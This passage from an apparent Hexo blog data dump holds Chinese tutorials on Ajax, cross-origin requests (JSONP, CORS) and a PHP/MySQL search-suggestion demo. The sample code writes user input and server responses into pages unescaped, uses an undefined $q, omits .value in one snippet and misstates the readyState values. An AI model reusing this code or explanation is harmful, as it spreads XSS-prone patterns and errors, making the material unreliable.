class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过检测 window 对象中是否有 XMLHttpRequest 属性来确定浏览器是否支持标准的 XMLHttpRequest。</p>\n<p><strong>注意，请不要用浏览器的 navigator.userAgent 来检测浏览器是否支持某个 Javascript 特性。因为这个字符串可以伪造，而且一般不会采用通过 IE 的版本判断 Javascript 特性。</strong> </p>\n<p>当然也可以使用 try catch 语句来创建 XMLHttpRequest 对象。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\trequest = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">&#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">\t\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Msxml2.XMLHTTP'</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">catch</span>(e)&#123;</span><br><span class=\"line\">\t\trequest = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基本上常用的创建 Ajax 对象的方式就是这两种，可以选择封装在一个函数中。</p>\n<blockquote>\n<p>XMLHttp=new XMLHttpRequest() 已经被大多数现代标准浏览器所支持。<br>但为了兼容IE浏览器，按微软的方式：XMLHttp=new<br>ActiveXObject(“Msxml2.XMLHTTP”) 支持IE6+的版本。<br>如果捕获错误，则尝试更老的方法：XMLHttp=new<br>ActiveXObject(“Microsoft.XMLHTTP”) 支持IE5.5+的版本。</p>\n</blockquote>\n<h3 id=\"设置回调函数\"><a href=\"#设置回调函数\" class=\"headerlink\" title=\"设置回调函数\"></a>设置回调函数</h3><p>在创建 Ajax 请求后，要先设置 onreadystatechange 回调函数(即在请求数据返回后进行的操作)。在回调函数中通常我们只需通过 readyState === 4 判断请求是否完成。如果已完成，再根据 status === 200 判断是否是一个成功的响应。</p>\n<p>readyState 值：(1.2.3.4.5)</p>\n<ol>\n<li>请求未初始化</li>\n<li>服务器连接已建立</li>\n<li>请求已接收</li>\n<li>请求处理中</li>\n<li>请求已完成，且响应已就绪</li>\n</ol>\n<p>code:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">request.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.readyState === <span class=\"number\">4</span>)&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request.status === <span class=\"number\">200</span>)&#123;      </span><br><span class=\"line\">            <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>).innerHTML = request.responseText;       </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"发送请求\"><a href=\"#发送请求\" class=\"headerlink\" title=\"发送请求\"></a>发送请求</h3><p>接下来就是要设置 XMLHttpRequest 对象中的 open() 方法，open() 方法一共接受三个参数，第一个参数指定是 GET 还是 POST，第二个参数指定 URL 地址，第三个参数指定是否使用异步发送请求，默认值是 true，所以可以不用填写。</p>\n<p><strong>注意：千万不要把第三个参数设置为 false，否则浏览器将停止响应，直到 Ajax 请求完成，如果这个请求耗时10秒，那么10秒内你会发现浏览器处于’假死’状态。</strong></p>\n<p>最后调用 send()方法才算真正发送请求，GET 请求不需要参数，POST 请求需要把 body 部分以字符串或者 FormData 对象传进去。</p>\n<p>code:</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'submit'</span>).onclick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> url = <span class=\"string\">'index.php?'</span> +<span class=\"string\">'name='</span> + <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'name'</span>); </span><br><span class=\"line\">    request.open(<span class=\"string\">'GET'</span>,url,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>给提交按钮绑定一个点击事件，在点击的时候将请求数据发送给后台，return false避免表单提交。</p>\n<p>这样 Ajax 请求就完成了，已经可以实现不刷新页面局部刷新。</p>\n<h3 id=\"后台代码\"><a href=\"#后台代码\" class=\"headerlink\" title=\"后台代码\"></a>后台代码</h3><p>这里我使用 php 来完成实例。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a[]=<span class=\"string\">\"Anna\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Brittany\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Cinderella\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Diana\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Eva\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Fiona\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Gunda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Hege\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Inga\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Johanna\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Kitty\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Nina\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Ophelia\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Petunia\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Amanda\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Raquel\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Cindy\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Doris\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Eve\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Evita\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Sunniva\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Tove\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Unni\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Violet\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Liza\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Elizabeth\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Ellen\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Wenche\"</span>;</span><br><span class=\"line\">$a[]=<span class=\"string\">\"Vicky\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$name = $_GET[<span class=\"string\">'name'</span>];</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($name) &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    $result = <span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i = <span class=\"number\">0</span>; $i &lt; count($a); $i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strtolower($name) == strtolower($a[$i]))&#123;</span><br><span class=\"line\">            $result = <span class=\"string\">\"find the person: $a[$i]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($result == <span class=\"string\">''</span>)&#123;</span><br><span class=\"line\">    $result = <span class=\"string\">\"Can't find the person: $name\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $result;</span><br></pre></td></tr></table></figure>\n<p>这样前后端就可以跑通了。</p>\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p><img src=\"/assets/2016-02-29-ajax-cross-origin/3.png\" alt=\"\"></p>\n<p><img src=\"/assets/2016-02-29-ajax-cross-origin/4.png\" alt=\"\"></p>\n<h2 id=\"安全限制\"><a href=\"#安全限制\" class=\"headerlink\" title=\"安全限制\"></a>安全限制</h2><p>注意到了上面 URL 使用的相对路径，如果将它改成绝对路径比如：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">'http://127.0.0.1:63342/htdocs/ajax/request.php?name='</span> + <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'name'</span>).value;</span><br></pre></td></tr></table></figure>\n<p>将会报错，在 Chrome 的控制台里，还可以看到错误信息。</p>\n<p>这是因为浏览器的同源策略导致的。默认情况下，JavaScript 在发送 Ajax 请求时，URL的域名必须和当前页面完全一致。</p>\n<blockquote>\n<p>完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。</p>\n</blockquote>\n<h2 id=\"跨域请求方法\"><a href=\"#跨域请求方法\" class=\"headerlink\" title=\"跨域请求方法\"></a>跨域请求方法</h2><p>一、是通过 Flash 插件发送 HTTP 请求，这种方式可以绕过浏览器的安全限制，但必须安装 Flash，并且跟 Flash 交互。不过 Flash 用起来麻烦，而且现在用得也越来越少了。</p>\n<p>二、是通过在同源域名下架设一个代理服务器来转发，JavaScript 负责把请求发送到代理服务器：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;/proxy?url=http:/www.example.com&apos;</span><br></pre></td></tr></table></figure>\n<p>代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。</p>\n<p>三、JSONP</p>\n<blockquote>\n<p>即JSON with Padding，是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。</p>\n</blockquote>\n<p>它有个限制，只能用GET请求，并且要求返回 JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用 JavaScript 资源。</p>\n<p>即Web页面上调用Js文件时可以不受跨域限制的影响，不仅如此，凡是拥有’src’这个属性的标签都拥有跨域的能力，比如：script, img, iframe标签。</p>\n<p>代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jsonp = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'script'</span>);</span><br><span class=\"line\">jsonp.type = <span class=\"string\">'text/javascript'</span>;</span><br><span class=\"line\">jsonp.src = <span class=\"string\">'http://www.example.com/remote.js'</span>;</span><br><span class=\"line\"><span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">'head'</span>)[<span class=\"number\">0</span>].appendChild(jsonp);</span><br></pre></td></tr></table></figure>\n<p>四、CORS</p>\n<blockquote>\n<p>Cross-Origin Resource Sharing 跨域资源共享, CORS 是一种允许当前域（domain）的资源（比如html/js/web service）被其他域（domain）的脚本请求访问的机制。</p>\n</blockquote>\n<p>注：如果浏览器支持 HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。</p>\n<h4 id=\"在了解CORS前，先来搞清楚概念：\"><a href=\"#在了解CORS前，先来搞清楚概念：\" class=\"headerlink\" title=\"在了解CORS前，先来搞清楚概念：\"></a>在了解CORS前，先来搞清楚概念：</h4><p>Origin 表示本域，也就是浏览器当前页面的域。当 JavaScript 向外域（如sina.com）发起请求后，浏览器收到响应后，首先检查 Access-Control-Allow-Origin 是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript 将无法获取到响应的任何数据。</p>\n<p><img src=\"/assets/2016-02-29-ajax-cross-origin/5.png\" alt=\"\"></p>\n<p>假设本域是 my.com，外域是 sina.com，只要响应头 Access-Control-Allow-Origin为 <a href=\"http://my.com，或者是*，本次请求就可以成功。\">http://my.com，或者是*，本次请求就可以成功。</a></p>\n<p>可见，跨域能否成功，取决于对方服务器是否愿意给你设置一个正确的 Access-Control-Allow-Origin，决定权始终在对方手中。 </p>\n<p>服务器端对于 CORS 的支持，主要就是通过设置 Access-Control-Allow-Origin 来进行的,可以添加 header 头：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//php</span></span><br><span class=\"line\">header(<span class=\"string\">\"Access-Control-Allow-Origin: http://www.example.com\"</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>上面这种跨域请求，称之为“简单请求”。简单请求包括 GET、HEAD和POST(POST的Content-Type类型 仅限application/x-www-form-urlencoded、multipart/form-data和text/plain)，并且不能出现任何自定义头(例如，X-Custom: 12345),通常能满足90%的需求。</p>\n</blockquote>\n<p>注：现代浏览器一般都是用JSONP或者CORS来完成跨域请求。</p>\n<p>CORS与JSONP相比，更为先进、方便和可靠。</p>\n<ol>\n<li>JSONP只能实现GET请求，而CORS支持所有类型的HTTP请求。  </li>\n<li>使用CORS，开发者可以使用普通的XMLHttpRequest发起请求和获得数据，比起JSONP有更好的错误处理。  </li>\n<li>JSONP主要被老的浏览器支持，它们往往不支持CORS，而绝大多数现代浏览器都已经支持了CORS。  </li>\n</ol>\n"},{"layout":"post","title":"Ajax - 模拟百度搜索","date":"2016-03-01T04:00:00.000Z","author":"Lindz","header-img":"img/7.jpg","_content":"\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n在阅读此文前，建议先阅读  [Ajax - 跨域请求](http://www.happylindz.com/2016/03/01/2016-02-29-ajax-and-cross-origin/) 熟悉一下 AJax 请求，本文会跳过一些细节代码的实现说明。\n\n\n实现效果：\n\n![](/assets/2016-03-01-ajax-baidu-search/1.png)\n\n如上图所示，在输入搜索字的时候，百度向后台发起 AJax 请求，并将后台提示信息反馈在页面上。\n\n实现起来并不困难，话不多说，就来亲自实践一下。\n\n## html 部分：\n\n首先创建 index.html，添加如下结构：\n\n```html\n<img src=\"bd_logo.png\" id=\"logo\">\n<form>\n    <input type=\"text\" id=\"search\" onkeyup=\"showHint(this.value)\" />\n    <input type=\"button\" value=\"百度一下\" id=\"btn\"/>\n</form>\n```\n之后在创建 basic.css，添加一些样式并引入到html中：\n\n```css\nbody{\n    text-align: center;\n}\n#logo{\n    width: 300px;\n}\n#search{\n    padding: 9px 7px;\n    width: 521px;\n    height: 20px;\n    maxlength: 100;\n    margin: 0;\n    border: 1px solid #b8b8b8;\n    font: 16px arial;\n}\n#btn{\n    cursor: pointer;\n    width: 102px;\n    height: 38px;\n    font-weight: normal;\n    color: #FFF;\n    background: #38f;\n    line-height: 38px;\n    font-size: 16px;\n    font-family: Arial;\n    padding: 0;\n    border: 0;\n    margin: 0;\n}\n```\n这时候基本页面就有了，效果如下：  \n\n![](/assets/2016-03-01-ajax-baidu-search/2.png)\n\n在编写 AJax 请求时候，先在数据库创建一些伪造数据。\n\n## 创建搜索数据：\n\n创建一个create.sql文件，编写如下代码：\n\n```sql\ncreate database baidu_search;\n\nuse baidu_search;\n\ncreate table myData(\nid int auto_increment primary key,\ndata varchar(20) not null\n);\n\ninsert into myData values (1,'ALin');\ninsert into myData values (2,'Amy');\ninsert into myData values (3,'Brittany');\ninsert into myData values (4,'Bully');\ninsert into myData values (5,'Eve');\ninsert into myData values (6,'Evita');\ninsert into myData values (7,'Eva');\ninsert into myData values (8,'Amanda');\ninsert into myData values (9,'Ellen');\ninsert into myData values (10,'Elizabeth');\ninsert into myData values (11,'Anna');\ninsert into myData values (12,'Abel');\ninsert into myData values (13,'Addison');\ninsert into myData values (14,'Alan');\ninsert into myData values (15,'Alfred');\ninsert into myData values (16,'Alger');\ninsert into myData values (17,'Allen');\n```\n\n接着我使用 php 来访问数据库并执行 sql 语句，创建一个 createdb.php, 编写如下代码:\n\n```php\n$servername = 'your servername';\n$username = 'your username';\n$password = 'your password';\n\n$con = new mysqli($servername,$username,$password);\n\nif(!$con){\n    echo \"Can't find the database.\";\n    exit();\n}\n$sql = file_get_contents('create.sql');\n$con->multi_query($sql);\n```\n这时候数据就已经创建成功了，接着可以从终端查看添加的数据:\n\n![](/assets/2016-03-01-ajax-baidu-search/3.png)\n\n数据创建好后就可以开始编写 Javascript 代码了。\n\n## Ajax 请求部分：\n\n创建一个 search.js 文件，然后引入到 body 底部表单之后。 \n \n在 js 代码中，首先创建封装好的 Ajax 对象函数，代码如下：  \n\n```javascript\nfunction getAjaxObject(){\n    var request;\n    if (window.XMLHttpRequest){\n        request = new XMLHttpRequest();\n    }else{\n        request = new ActiveXObject('Microsoft.XMLHTTP');\n    }\n    return request;\n}\n```\n之后在编写回调函数，代码如下： \n\n```javascript\nfunction callback(){\n    if (request.readyState === 4){\n        if (request.status === 200){\n            var result = document.createElement('div');\n            result.id = 'result';\n            document.body.appendChild(result);\n            document.getElementById('result').innerHTML += request.responseText;\n        }\n    }\n}\n```\n**这里动态创建一个 div，并且将后台返回的数据添加到 div 中，再将此 div 添加到 body 中。**\n\n之后就可以创建一个 showHint 函数用来发送 AJax 请求，代码如下：\n\n```javascript\t\nvar request = null;\nfunction showHint(val){\n    if (document.getElementById('result')){\n        var result = document.getElementById('result');\n        result.parentNode.removeChild(result);\n    }\n    if (val.length == 0){\n        return false;\n    }\n    request = getAjaxObject();\n    if (request === null){\n        alert(\"Your browser doesn't support AJax\");\n        return false;\n    }\n    request.onreadystatechange = callback;\n    var url = 'getHint.php?q=' + val;\n    request.open('GET',url,true);\n    request.send();\n}\n```\n之后将 onkeyup=\"showHint(this.value)\" 添加到属性为 text 的 input 标签中，即：\n\n```html\n<input type=\"text\" id=\"search\" onkeyup=\"showHint(this.value)\" />\n```\n这样每当数据一个字符的时候，将调用一次 showHint 函数用来发起 AJax 请求，达到每次输入每次查询的效果。\n\n## 后台部分：\n\n创建一个getHint.php文件，编写如下代码：\n\n```php\n$servername = 'your servername';\n$username = 'your username';\n$password = 'your password';\n$db = 'baidu_search';\n\n$con = new mysqli($servername,$username,$password);\n\nif(!$con){\n    echo \"Can't find the database.\";\n    exit();\n}\n$con->select_db($db);\n\n$sql = \"Select * from myData;\";\n$result = $con->query($sql);\n\nwhile($row = $result->fetch_array()){\n    if(strtolower($q) == strtolower(substr($row['data'],0,strlen($q)))){\n        echo \"<p>\";\n        echo \"<a href='#'>\".$row['data'].\"</a><br>\";\n        echo \"</p>\";\n    }\n}\n```\n\n自此前后端已经可以正常的发起搜索功能。\n\n## 美化搜索框：\n\n在 basic.css 中添加一些样式：\n\n```css\n#result{\n    text-align: left;\n    width: 535px;\n    position: relative;\n    margin-left: 310px;\n    border: 1px solid #b8b8b8;\n    box-shadow: 1px 1px 1px 1px #eeeeee;\n}\n#result > p{\n    margin: 0;\n    padding: 0;\n}\n#result p > a{\n    text-decoration: none;\n    color: #000;\n    line-height: 25px;\n    font-size: 25px;\n}\n#result p:hover{\n    cursor: pointer;\n    background: #eee;\n}\n```\n\n## 最终效果：\n\n![](/assets/2016-03-01-ajax-baidu-search/4.png)\n\n![](/assets/2016-03-01-ajax-baidu-search/5.png)\n\n\n\n\n\n\n","source":"_posts/2016-03-01-ajax-baidu-search.md","raw":"---\nlayout:     post\ntitle:      \"Ajax - 模拟百度搜索\"\ndate:       2016-03-01 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/7.jpg\"\ntags:\n    - Ajax\n    - Javascript\n    - PHP\n---\n\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n在阅读此文前，建议先阅读  [Ajax - 跨域请求](http://www.happylindz.com/2016/03/01/2016-02-29-ajax-and-cross-origin/) 熟悉一下 AJax 请求，本文会跳过一些细节代码的实现说明。\n\n\n实现效果：\n\n![](/assets/2016-03-01-ajax-baidu-search/1.png)\n\n如上图所示，在输入搜索字的时候，百度向后台发起 AJax 请求，并将后台提示信息反馈在页面上。\n\n实现起来并不困难，话不多说，就来亲自实践一下。\n\n## html 部分：\n\n首先创建 index.html，添加如下结构：\n\n```html\n<img src=\"bd_logo.png\" id=\"logo\">\n<form>\n    <input type=\"text\" id=\"search\" onkeyup=\"showHint(this.value)\" />\n    <input type=\"button\" value=\"百度一下\" id=\"btn\"/>\n</form>\n```\n之后在创建 basic.css，添加一些样式并引入到html中：\n\n```css\nbody{\n    text-align: center;\n}\n#logo{\n    width: 300px;\n}\n#search{\n    padding: 9px 7px;\n    width: 521px;\n    height: 20px;\n    maxlength: 100;\n    margin: 0;\n    border: 1px solid #b8b8b8;\n    font: 16px arial;\n}\n#btn{\n    cursor: pointer;\n    width: 102px;\n    height: 38px;\n    font-weight: normal;\n    color: #FFF;\n    background: #38f;\n    line-height: 38px;\n    font-size: 16px;\n    font-family: Arial;\n    padding: 0;\n    border: 0;\n    margin: 0;\n}\n```\n这时候基本页面就有了，效果如下：  \n\n![](/assets/2016-03-01-ajax-baidu-search/2.png)\n\n在编写 AJax 请求时候，先在数据库创建一些伪造数据。\n\n## 创建搜索数据：\n\n创建一个create.sql文件，编写如下代码：\n\n```sql\ncreate database baidu_search;\n\nuse baidu_search;\n\ncreate table myData(\nid int auto_increment primary key,\ndata varchar(20) not null\n);\n\ninsert into myData values (1,'ALin');\ninsert into myData values (2,'Amy');\ninsert into myData values (3,'Brittany');\ninsert into myData values (4,'Bully');\ninsert into myData values (5,'Eve');\ninsert into myData values (6,'Evita');\ninsert into myData values (7,'Eva');\ninsert into myData values (8,'Amanda');\ninsert into myData values (9,'Ellen');\ninsert into myData values (10,'Elizabeth');\ninsert into myData values (11,'Anna');\ninsert into myData values (12,'Abel');\ninsert into myData values (13,'Addison');\ninsert into myData values (14,'Alan');\ninsert into myData values (15,'Alfred');\ninsert into myData values (16,'Alger');\ninsert into myData values (17,'Allen');\n```\n\n接着我使用 php 来访问数据库并执行 sql 语句，创建一个 createdb.php, 编写如下代码:\n\n```php\n$servername = 'your servername';\n$username = 'your username';\n$password = 'your password';\n\n$con = new mysqli($servername,$username,$password);\n\nif(!$con){\n    echo \"Can't find the database.\";\n    exit();\n}\n$sql = file_get_contents('create.sql');\n$con->multi_query($sql);\n```\n这时候数据就已经创建成功了，接着可以从终端查看添加的数据:\n\n![](/assets/2016-03-01-ajax-baidu-search/3.png)\n\n数据创建好后就可以开始编写 Javascript 代码了。\n\n## Ajax 请求部分：\n\n创建一个 search.js 文件，然后引入到 body 底部表单之后。 \n \n在 js 代码中，首先创建封装好的 Ajax 对象函数，代码如下：  \n\n```javascript\nfunction getAjaxObject(){\n    var request;\n    if (window.XMLHttpRequest){\n        request = new XMLHttpRequest();\n    }else{\n        request = new ActiveXObject('Microsoft.XMLHTTP');\n    }\n    return request;\n}\n```\n之后在编写回调函数，代码如下： \n\n```javascript\nfunction callback(){\n    if (request.readyState === 4){\n        if (request.status === 200){\n            var result = document.createElement('div');\n            result.id = 'result';\n            document.body.appendChild(result);\n            document.getElementById('result').innerHTML += request.responseText;\n        }\n    }\n}\n```\n**这里动态创建一个 div，并且将后台返回的数据添加到 div 中，再将此 div 添加到 body 中。**\n\n之后就可以创建一个 showHint 函数用来发送 AJax 请求，代码如下：\n\n```javascript\t\nvar request = null;\nfunction showHint(val){\n    if (document.getElementById('result')){\n        var result = document.getElementById('result');\n        result.parentNode.removeChild(result);\n    }\n    if (val.length == 0){\n        return false;\n    }\n    request = getAjaxObject();\n    if (request === null){\n        alert(\"Your browser doesn't support AJax\");\n        return false;\n    }\n    request.onreadystatechange = callback;\n    var url = 'getHint.php?q=' + val;\n    request.open('GET',url,true);\n    request.send();\n}\n```\n之后将 onkeyup=\"showHint(this.value)\" 添加到属性为 text 的 input 标签中，即：\n\n```html\n<input type=\"text\" id=\"search\" onkeyup=\"showHint(this.value)\" />\n```\n这样每当数据一个字符的时候，将调用一次 showHint 函数用来发起 AJax 请求，达到每次输入每次查询的效果。\n\n## 后台部分：\n\n创建一个getHint.php文件，编写如下代码：\n\n```php\n$servername = 'your servername';\n$username = 'your username';\n$password = 'your password';\n$db = 'baidu_search';\n\n$con = new mysqli($servername,$username,$password);\n\nif(!$con){\n    echo \"Can't find the database.\";\n    exit();\n}\n$con->select_db($db);\n\n$sql = \"Select * from myData;\";\n$result = $con->query($sql);\n\nwhile($row = $result->fetch_array()){\n    if(strtolower($q) == strtolower(substr($row['data'],0,strlen($q)))){\n        echo \"<p>\";\n        echo \"<a href='#'>\".$row['data'].\"</a><br>\";\n        echo \"</p>\";\n    }\n}\n```\n\n自此前后端已经可以正常的发起搜索功能。\n\n## 美化搜索框：\n\n在 basic.css 中添加一些样式：\n\n```css\n#result{\n    text-align: left;\n    width: 535px;\n    position: relative;\n    margin-left: 310px;\n    border: 1px solid #b8b8b8;\n    box-shadow: 1px 1px 1px 1px #eeeeee;\n}\n#result > p{\n    margin: 0;\n    padding: 0;\n}\n#result p > a{\n    text-decoration: none;\n    color: #000;\n    line-height: 25px;\n    font-size: 25px;\n}\n#result p:hover{\n    cursor: pointer;\n    background: #eee;\n}\n```\n\n## 最终效果：\n\n![](/assets/2016-03-01-ajax-baidu-search/4.png)\n\n![](/assets/2016-03-01-ajax-baidu-search/5.png)\n\n\n\n\n\n\n","slug":"2016-03-01-ajax-baidu-search","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rx7000cxmvdfu0w7eh7","content":"<blockquote>\n<p>本文为原创作品。欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<p>在阅读此文前，建议先阅读  <a href=\"http://www.happylindz.com/2016/03/01/2016-02-29-ajax-and-cross-origin/\" target=\"_blank\" rel=\"external\">Ajax - 跨域请求</a> 熟悉一下 AJax 请求，本文会跳过一些细节代码的实现说明。</p>\n<p>实现效果：</p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/1.png\" alt=\"\"></p>\n<p>如上图所示，在输入搜索字的时候，百度向后台发起 AJax 请求，并将后台提示信息反馈在页面上。</p>\n<p>实现起来并不困难，话不多说，就来亲自实践一下。</p>\n<h2 id=\"html-部分：\"><a href=\"#html-部分：\" class=\"headerlink\" title=\"html 部分：\"></a>html 部分：</h2><p>首先创建 index.html，添加如下结构：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span 